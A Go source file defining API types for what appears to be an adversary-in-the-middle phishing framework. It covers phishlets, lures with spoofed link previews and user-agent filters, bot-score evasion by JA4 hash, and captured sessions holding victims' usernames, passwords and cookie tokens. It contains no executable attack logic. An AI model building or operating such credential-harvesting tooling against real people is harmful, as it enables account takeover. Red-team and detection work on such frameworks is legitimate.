package api

import "time"

// ErrorResponse is the JSON body returned for all error responses.
type ErrorResponse struct {
	Error string `json:"error"` // human-readable message
	Code  string `json:"code"`  // machine-readable code for the CLI to switch on
}

// PaginatedResponse is the wrapper for all list endpoint responses.
type PaginatedResponse[T any] struct {
	Items  []T `json:"items"`
	Total  int `json:"total"`  // total matching records (ignores limit/offset)
	Limit  int `json:"limit"`
	Offset int `json:"offset"`
}

// --- Sessions ---

type SessionResponse struct {
	ID           string                       `json:"id"`
	Phishlet     string                       `json:"phishlet"`
	LureID       string                       `json:"lure_id"`
	RemoteAddr   string                       `json:"remote_addr"`
	UserAgent    string                       `json:"user_agent"`
	JA4Hash      string                       `json:"ja4_hash"`
	BotScore     float64                      `json:"bot_score"`
	Username     string                       `json:"username"`
	Password     string                       `json:"password"`
	Custom       map[string]string            `json:"custom"`
	CookieTokens map[string]map[string]string `json:"cookie_tokens"` // domain → name → value
	BodyTokens   map[string]string            `json:"body_tokens"`
	HTTPTokens   map[string]string            `json:"http_tokens"`
	StartedAt    time.Time                    `json:"started_at"`
	CompletedAt  *time.Time                   `json:"completed_at"`
}

// --- Lures ---

type CreateLureRequest struct {
	Phishlet    string `json:"phishlet"`     // required
	BaseDomain  string `json:"base_domain"`  // optional
	Path        string `json:"path"`         // optional, auto-generated if empty
	RedirectURL string `json:"redirect_url"` // optional
	SpoofURL    string `json:"spoof_url"`    // optional
	UAFilter    string `json:"ua_filter"`    // optional regex
	OGTitle     string `json:"og_title"`
	OGDesc      string `json:"og_desc"`
	OGImage     string `json:"og_image"`
	OGURL       string `json:"og_url"`
	Redirector  string `json:"redirector"`
}

type UpdateLureRequest struct {
	RedirectURL *string `json:"redirect_url"`
	SpoofURL    *string `json:"spoof_url"`
	UAFilter    *string `json:"ua_filter"`
	OGTitle     *string `json:"og_title"`
	OGDesc      *string `json:"og_desc"`
	OGImage     *string `json:"og_image"`
	OGURL       *string `json:"og_url"`
	Redirector  *string `json:"redirector"`
}

type LureResponse struct {
	ID          string    `json:"id"`
	Phishlet    string    `json:"phishlet"`
	BaseDomain  string    `json:"base_domain"`
	Hostname    string    `json:"hostname"`
	Path        string    `json:"path"`
	RedirectURL string    `json:"redirect_url"`
	SpoofURL    string    `json:"spoof_url"`
	UAFilter    string    `json:"ua_filter"`
	PausedUntil time.Time `json:"paused_until,omitempty"`
	OGTitle     string    `json:"og_title"`
	OGDesc      string    `json:"og_desc"`
	OGImage     string    `json:"og_image"`
	OGURL       string    `json:"og_url"`
	Redirector  string    `json:"redirector"`
}

type GenerateURLRequest struct {
	Params map[string]string `json:"params"`
}

type GenerateURLResponse struct {
	URL string `json:"url"`
}

type PauseLureRequest struct {
	Duration string `json:"duration"` // Go duration string, e.g. "15m", "2h"
}

// --- Phishlets ---

type PhishletResponse struct {
	Name        string `json:"name"`
	ParentName  string `json:"parent_name,omitempty"`
	BaseDomain  string `json:"base_domain"`
	Hostname    string `json:"hostname"`
	DNSProvider string `json:"dns_provider"`
	UnauthURL   string `json:"unauth_url"`
	SpoofURL    string `json:"spoof_url"`
	Enabled     bool   `json:"enabled"`
	Hidden      bool   `json:"hidden"`
}

type EnablePhishletRequest struct {
	Hostname    string `json:"hostname"`
	BaseDomain  string `json:"base_domain"`
	DNSProvider string `json:"dns_provider"`
}

type CreateSubPhishletRequest struct {
	ParentName string            `json:"parent_name"` // required
	Name       string            `json:"name"`        // required
	Params     map[string]string `json:"params"`
}

// --- Blacklist ---

type BlacklistEntryResponse struct {
	Value string `json:"value"` // IP or CIDR string
}

type AddBlacklistEntryRequest struct {
	Value string `json:"value"` // required
	Note  string `json:"note"`  // optional annotation (stored in-memory only)
}

// --- BotGuard ---

type BotSignatureResponse struct {
	JA4Hash     string    `json:"ja4_hash"`
	Description string    `json:"description"`
	AddedAt     time.Time `json:"added_at"`
}

type AddBotSignatureRequest struct {
	JA4Hash     string `json:"ja4_hash"`    // required
	Description string `json:"description"` // optional
}

type UpdateBotThresholdRequest struct {
	Threshold float64 `json:"threshold"` // 0.0–1.0
}

// --- System ---

type StatusResponse struct {
	Version        string    `json:"version"`
	Uptime         string    `json:"uptime"`          // human-readable, e.g. "3h24m"
	UptimeSeconds  float64   `json:"uptime_seconds"`
	GoRoutines     int       `json:"goroutines"`
	TotalSessions  int       `json:"total_sessions"`
	ActiveSessions int       `json:"active_sessions"` // started in last hour, not completed
	StartedAt      time.Time `json:"started_at"`
}
